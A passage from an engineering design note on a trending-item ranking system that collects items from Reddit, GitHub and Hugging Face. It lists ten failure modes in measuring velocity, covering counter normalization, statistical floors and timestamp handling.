the failure is invisible: the collector keeps working, it just starts treating
stored items as new, which resets their age and erases the snapshot velocity is
measured against. Page every query that can exceed a thousand rows, and order it
explicitly so the pages are stable.

**Failure modes, in the order they will be hit:**

1. Reddit `hot` used directly — everything floats up with age.
2. Absolute GitHub stars or HF downloads — 2019 repos rank forever.
3. HF downloads counted per file, so a ten-file repo shows 10× traffic.
4. MAD = 0 on a low-volume source — floor `σ̂` at 0.22, refuse a z from a bucket
   with n < 30.
5. Percent growth on tiny counters — 2 → 6 upvotes beats 800 → 1100. Use the
   prior-damped log ratio.
6. `velocity = 0` for a new item — must be `null`, or new items never enter.
7. Non-monotonic counters from cached API reads — clamp to `max(now, prev)`, but
   treat a sustained >20% drop across two snapshots as a real deletion.
8. Comments weighted like upvotes — promotes flamewars.
9. `first_seen_at` alone — a crawler restart makes the whole world new.
10. `published_at` alone — RSS backfills and 2001-dated feeds. Use
    `effective_at`: `published_at`, clamped to `first_seen_at` and to at most 48
    hours before it.
